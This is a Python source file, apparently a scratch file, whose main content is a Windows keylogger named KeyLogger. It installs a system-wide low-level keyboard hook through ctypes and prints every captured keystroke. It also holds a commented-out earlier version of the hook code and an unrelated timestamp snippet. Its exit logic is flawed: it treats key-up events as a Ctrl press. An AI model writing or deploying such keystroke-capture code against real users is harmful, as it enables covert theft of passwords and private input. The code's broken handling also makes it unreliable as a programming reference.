# import sys
# from ctypes import *
# from ctypes.wintypes import DWORD, HHOOK, HINSTANCE, MSG, WPARAM, LPARAM
#
# user32 = CDLL("user32.dll")
# kernel32 = CDLL("kernel32.dll")
#
#
# class KBDLLHOOKSTRUCT(Structure):
#     _fields_ = [
#         ('vkCode', DWORD),
#         ('scanCode', DWORD),
#         ('flags', DWORD),
#         ('time', DWORD),
#         ('dwExtraInfo', DWORD)]
#
#
# def uninstallHookProc(hooked):
#     if hooked is None:
#         return
#     user32.UnhookWindowsHookEx(hooked)
#     hooked = None
#
#
# def hookProc(nCode, wParam, lParam):
#     if nCode < 0:
#         return user32.CallNextHookEx(hooked, nCode, wParam, lParam)
#     else:
#         if wParam == 256:
#             if 162 == lParam.contents.value:
#                 print("Ctrl pressed, call Hook uninstall()")
#                 uninstallHookProc(hooked)
#                 sys.exit(-1)
#             capsLock = user32.GetKeyState(20)
#             # kb_struct = cast(lParam, POINTER(KBDLLHOOKSTRUCT))
#             if lParam.contents.value == 13:
#                 print("\n")
#             elif capsLock:
#                 print(chr(lParam.contents.value), end="")
#             else:
#                 print(chr(lParam.contents.value + 32), end="")
#     return user32.CallNextHookEx(hooked, nCode, wParam, lParam)
#
#
# def startKeyLog():
#     msg = MSG()
#     user32.GetMessageA(byref(msg), 0, 0, 0)
#
#
# def installHookProc(hooked, pointer):
#     hooked = user32.SetWindowsHookExA(
#         13,
#         pointer,
#         kernel32.GetModuleHandleW(None),
#         0
#     )
#     if not hooked:
#         return False
#     return True
#
#
# HOOKPROC = WINFUNCTYPE(c_int, c_int, c_int, POINTER(DWORD))
# pointer = HOOKPROC(hookProc)
# hooked = None
# if installHookProc(hooked, pointer):
#     print("Hook installed")
#     try:
#         msg = MSG()
#         user32.GetMessageA(byref(msg), 0, 0, 0)
#     except KeyboardInterrupt as kerror:
#         uninstallHookProc(hooked)
#         print("Hook uninstall...")
# else:
#     print("Hook installed error")
# import datetime
#
# print(int(datetime.datetime.now().timestamp()))
#
#
# def epoch_to_datetime(epoch: int) -> datetime:
#     return datetime.datetime.fromtimestamp(epoch / 1000).strftime("%d.%m.%Y %H:%M:%S")
#
#
# def returned_string(text: str or int, text_before: str = "", text_after: str = "") -> None:
#     print(f"[*]{text_before} {text} {text_after}")
#
#
# if __name__ == '__main__':
#     print(datetime.datetime.fromtimestamp(int(datetime.datetime.now().timestamp())))
import datetime
import sys
from ctypes import *
from ctypes import wintypes
from ctypes.wintypes import MSG, HANDLE, HINSTANCE
from ctypes.wintypes import DWORD

user32 = windll.user32
kernel32 = windll.kernel32

user32.SetWindowsHookExA.argtypes = (c_int, HANDLE, HINSTANCE, DWORD)
kernel32.GetModuleHandleW.restype = wintypes.HMODULE
kernel32.GetModuleHandleW.argtypes = [wintypes.LPCWSTR]

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
CTRL_CODE = 162


class KeyLogger:

    def __init__(self):
        self.lUser32 = user32
        self.hooked = None
        self.pointer = self._getFPTR(self.hookProc)

    def installHookProc(self, pointer):
        self.hooked = self.lUser32.SetWindowsHookExA(
            WH_KEYBOARD_LL,
            pointer,
            kernel32.GetModuleHandleW(None),
            0
        )
        if not self.hooked:
            return False
        return True

    def uninstallHookProc(self):
        if self.hooked is None:
            return
        self.lUser32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None

    def _getFPTR(self, fn):
        CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
        return CMPFUNC(fn)

    def hookProc(self, nCode, wParam, lParam):
        # if wParam is not WM_KEYDOWN:
        #     return user32.CallNextHookEx(KeyLogger.hooked, nCode, wParam, lParam)
        # hookedKey = chr(lParam[0])
        print("Hookedkey=" + str(lParam[0]) + ", KeyCode=" + str(lParam[0]))
        if wParam == 257:
            print("Ctrl pressed, call uninstallHook()")
            self.uninstallHookProc()
            sys.exit(-1)
        return user32.CallNextHookEx(self.hooked, nCode, wParam, lParam)

    def startKeyLog(self):
        self.installHookProc(self.pointer)
        msg = MSG()
        user32.GetMessageA(byref(msg), 0, 0, 0)


KeyLogger = KeyLogger()
KeyLogger.startKeyLog()
